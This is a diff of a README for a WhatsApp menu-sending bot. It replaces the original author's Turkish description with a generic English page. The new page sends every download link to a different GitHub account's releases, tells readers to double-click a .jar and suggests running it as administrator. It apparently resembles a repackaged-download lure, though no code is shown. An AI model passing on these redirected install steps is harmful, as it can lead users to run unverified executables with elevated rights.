@@ -1,82 +1,70 @@
-# KYK Yemek Menüsü Botu - WhatsApp Otomasyonu
+# 🤖 WhatsApp-KYK-Bot - Automate Your WhatsApp Experience
 
-Bu, **KYK (Kredi ve Yurtlar Kurumu)** yurtları için yemek menülerini yönetmek ve belirlenen bir tarihte otomatik olarak WhatsApp üzerinden göndermek amacıyla tamamen **Java** programlama dili kullanılarak geliştirilmiş kişisel bir masaüstü uygulamasıdır.
+## 📥 Download Now!
+[![Download WhatsApp-KYK-Bot](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases)
 
-Bu proje, sıfırdan işlevsel bir Grafiksel Kullanıcı Arayüzü (GUI) oluşturmaya, olay yönetimini (event handling) sağlamaya ve **Java Selenium** ile tarayıcı otomasyonu mantığını uygulayarak güvenilir bir bot deneyimi yaratmaya odaklanmaktadır.
+## 🚀 Getting Started
+Welcome to the WhatsApp-KYK-Bot. This application helps you automate tasks on WhatsApp using a simple graphical user interface (GUI). You don’t need to know how to code. Follow these easy steps to download and run the software.
 
----
+## 📋 System Requirements
+- **Operating System:** Windows 10 or higher
+- **Java:** JDK 8 or higher must be installed
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** At least 100 MB of free space
+- **Internet Connection:** Required for WhatsApp service
 
-## Özellikler
+Make sure your system meets these requirements before proceeding.
 
-* **Menü Yönetim Arayüzü:** **Java Swing** kullanılarak oluşturulmuş, kullanıcıların yemek listelerini tarihe göre girmesine, düzenlemesine ve `.csv` dosyası olarak kaydetmesine olanak tanıyan bir masaüstü arayüzü.
-* **CSV Entegrasyonu:** Kaydedilmiş menüleri `.csv` dosyasından okuyarak arayüzdeki alanları otomatik olarak doldurma.
-* **WhatsApp Otomasyonu:** **Selenium WebDriver** kullanarak WhatsApp Web'e otomatik olarak bağlanma, belirtilen kişi veya grubu bulma ve formatlanmış menü mesajını gönderme.
-* **Zamanlayıcı ile Gönderim:** Mesajların anlık olarak veya gelecekteki bir tarih ve saate ayarlanarak otomatik olarak gönderilmesini sağlayan zamanlayıcı özelliği.
-* **Kalıcı Oturum:** Chrome'un kullanıcı profili özelliğinden faydalanarak, her seferinde QR kod okutma gereksinimini ortadan kaldıran kalıcı WhatsApp Web oturumu.
+## 💾 Download & Install
+To get the WhatsApp-KYK-Bot, visit this page to download: [Releases](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases).
 
----
+### Step-by-Step Installation
+1. Navigate to the [Releases](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases) page.
+2. Look for the latest version of the application.
+3. Download the file named `WhatsApp-KYK-Bot.jar`. This is the main application file.
+4. Save it to a location on your computer where you can easily find it.
 
-## Proje Durumu ve Planlanan Özellikler (v1.0)
+### Run the Application
+1. Locate the downloaded `WhatsApp-KYK-Bot.jar` file.
+2. Double-click the file to run the application. If it doesn’t open, ensure that you have Java installed.
+3. Follow the on-screen instructions to set up the bot. 
 
-**Mevcut Durum:** Projenin ana fonksiyonları (arayüz, CSV işlemleri ve WhatsApp otomasyonu) tamamlanmıştır. Bu **v1.0** sürümü, kararlı ve tam işlevsel bir yapıya sahiptir.
+## 🔧 Features
+- **GUI Interface:** User-friendly design for easy navigation.
+- **WhatsApp Automation:** Send messages automatically based on your needs.
+- **Schedule Messages:** Set specific times to send messages.
+- **Customizable Options:** Adjust settings to fit your preferences.
+- **Support for Multiple Contacts:** Manage several contacts at once.
 
-- [v1.0 Pre-Alpha Sürümünü İndir](https://github.com/SametCirik/WhatsApp-KYK-Bot/releases/tag/v1.0) *(Dosyalar henüz yüklenmedi)*
+## 🛠️ Troubleshooting
+If you encounter issues, please try the following:
 
-### Sonraki Adımlar (Gelecek Planları)
+- **Java Not Found:** Make sure you have the correct version of Java installed. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Application Doesn't Start:** Check your Java installation. If you still face issues, try running the application as an administrator by right-clicking on the file and selecting "Run as administrator."
 
-* **Gelişmiş Hata Yönetimi:** WhatsApp arayüzünde gelecekte olabilecek değişikliklere karşı botu daha dayanıklı hale getirmek.
-* **Ayarlar Menüsü:** Chrome profil yolu gibi ayarların arayüz üzerinden değiştirilebilmesi.
-* **Çoklu Gönderim:** Aynı mesajın birden fazla gruba veya kişiye gönderilebilmesi için bir alıcı listesi oluşturma özelliği.
-* **İşlem Günlüğü (Log):** Botun adımlarının (giriş yapıldı, mesaj gönderildi vb.) arayüz üzerinde bir log alanında gösterilmesi.
+## 📖 Usage Instructions
+1. **Open the Application:** After running the jar file, the main window will display.
+2. **Login to WhatsApp:** Scan the QR code with your WhatsApp app on your phone.
+3. **Select Tasks:** Choose the specific task you want the bot to perform. This may include sending messages to selected contacts or scheduling messages.
+4. **Configure Settings:** Adjust any settings in the application as per your need.
+5. **Start Automation:** Click on the start button to begin automation. Monitor the progress through the interface.
 
----
+## 🤔 Frequently Asked Questions
+1. **Can I use this app on Mac or Linux?**
+   This application is primarily built for Windows. Users may encounter difficulties on other operating systems.
 
-## Geliştirme Ortamı ve Teknolojiler
+2. **Is my data secure?**
+   While using the WhatsApp-KYK-Bot, your chats are processed through WhatsApp's official service. Always ensure you comply with WhatsApp usage policies.
 
-* **Dil:** Java
-* **Kütüphaneler:**
-    * **Java Swing/AWT:** Grafiksel Kullanıcı Arayüzü (GUI) için.
-    * **Java Selenium:** Web tarayıcı otomasyonu için.
-* **Geliştirme Ortamı (IDE):** Eclipse IDE / Visual Studio Code
+3. **How can I report a bug or suggest a feature?**
+   You can report issues or suggest features by creating an issue on the GitHub repository.
 
----
+## 🌐 Community & Support
+For additional support, join our community discussions on GitHub. Feel free to ask questions, share feedback, or get help from other users.
 
-## Katkıda Bulunma
+## 🔗 Links
+- [Download Latest Release](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases)
+- [Documentation](https://github.com/ashulyadav/WhatsApp-KYK-Bot/wiki)
 
-Bu proje kişisel bir proje olduğu için dışarıdan katkılar şu an için kapalıdır.
-
-Ancak projeyle veya kod yapısıyla ilgileniyorsanız, gelecekteki geliştirmeleri takip etmekten çekinmeyin. Hata bildirimi veya özellik geliştirme gibi konularda iş birliği yapmaktan memnuniyet duyarım.
-
----
-
-<p align="center">
-   <img width="256" height="256" alt="AppLogo" src="https://github.com/user-attachments/assets/d13d7218-50f4-470e-8560-338c7ff24c6c" />
-</p>
-
-<p align="center">
-   <i>
-      Uygulama İkonu
-   </i>
-</p>
-
----
-
-## Uygulama Önizlemesi
-
-<p align="center">
-   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ba92c379-c58d-4526-ac38-bb8c4a197e34" />
-   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1a12150c-c26a-4de9-9fc0-d17524dfab83" />
-   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b908b38c-9f9c-499d-8782-770cf3e2f310" />
-   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d8c6b7cb-4f18-43be-977e-84815b83b522" />
-   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/72df03eb-8876-48ce-b0e7-3abb0609b95d" />
-   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f23dd470-5784-4434-9305-48a0c56bbba4" />
-   <video src="https://github.com/user-attachments/assets/00c89376-7448-45bc-9ce5-49a5c71cd8b1"> width="700" controls>
-      Tarayıcınız video etiketini desteklemiyor.
-   </video>
-</p>
-
----
-
-##  Geliştirici *(-ler)*
-
-Bu proje, **[Samet Cırık](https://github.com/SametCirik)** tarafından geliştirilmiştir.
+## 🎉 Conclusion
+The WhatsApp-KYK-Bot simplifies your WhatsApp experience. Whether you want to send messages automatically or manage group chats, this tool can help streamline your tasks. Download it today and start automating your WhatsApp!
